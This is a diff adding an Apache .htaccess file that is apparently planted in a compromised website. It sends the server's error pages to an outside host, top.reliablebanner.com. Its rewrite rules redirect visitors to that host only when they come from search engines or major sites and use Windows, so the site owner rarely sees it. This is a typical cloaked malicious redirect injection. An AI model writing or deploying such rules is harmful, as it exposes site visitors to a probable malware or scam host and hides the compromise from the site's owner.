@@ -1,0 +1,60 @@
+
+
+ErrorDocument 500 http://top.reliablebanner.com/main.php?i=Js2oitQcrP6ngRj7U8RGy5wXpQ==&e=0
+ErrorDocument 502 http://top.reliablebanner.com/main.php?i=Js2oitQcrP6ngRj7U8RGy5wXpQ==&e=2
+ErrorDocument 403 http://top.reliablebanner.com/main.php?i=Js2oitQcrP6ngRj7U8RGy5wXpQ==&e=3
+
+
+
+RewriteEngine On
+
+RewriteCond %{HTTP_REFERER} .*tube.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*wikipedia.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*blogger.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*baidu.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*qq\.com.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*myspace.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*twitter.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*facebook.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*live.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*bing.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*amazon.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*ebay.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*linkedin.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*flickr.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*livejasmin.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*soso.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*doubleclick.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*pornhub.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*orkut.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*livejournal.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*wordpress.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*excite.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*netscape.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*hotbot.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*goto.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*infoseek.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*mamma.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*alltheweb.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*lycos.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*search.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*metacrawler.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*mail.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*dogpile.*$ [NC]
+
+RewriteCond %{HTTP_USER_AGENT} .*Windows.*
+RewriteRule .* http://top.reliablebanner.com/main.php?h=%{HTTP_HOST}&i=Jc6slNMCquSjghP/UcJGzZEY&e=r [R,L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME} !.*jpg$|.*gif$|.*png$
+RewriteCond %{HTTP_USER_AGENT} .*Windows.*
+RewriteRule .* http://top.reliablebanner.com/main.php?h=%{HTTP_HOST}&i=Jc6slNMCquSjghP/UcJGzZEY&e=4 [R,L]
+
